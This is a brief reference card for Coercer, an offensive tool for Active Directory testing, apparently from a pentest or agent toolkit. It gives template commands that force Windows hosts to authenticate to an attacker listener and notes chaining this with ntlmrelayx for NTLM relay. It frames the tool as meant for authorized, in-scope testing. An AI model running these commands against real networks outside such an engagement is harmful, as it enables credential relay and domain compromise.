# coercer

**Category**: NTLM relay, coercion, and ADCS relay chains

**Purpose**: Coerce Windows hosts to authenticate to a listener using multiple RPC methods.

**When to use**: Use when NTLM relay, ADCS web enrollment, IPv6 poisoning, EFSRPC/MS-RPRN coercion, or machine account abuse is in scope.

## Commands
- `coercer`

## First Commands
- `coercer scan -u USER -p PASS -d DOMAIN -t TARGET`
- `coercer coerce -u USER -p PASS -d DOMAIN -l LISTENER -t TARGET`

## Notes
Use to trigger relay paths after setting up ntlmrelayx.

## Captured Help
No live help output was captured. Start with the commands above, or run the tool with `-h`/`--help` in the sandbox.
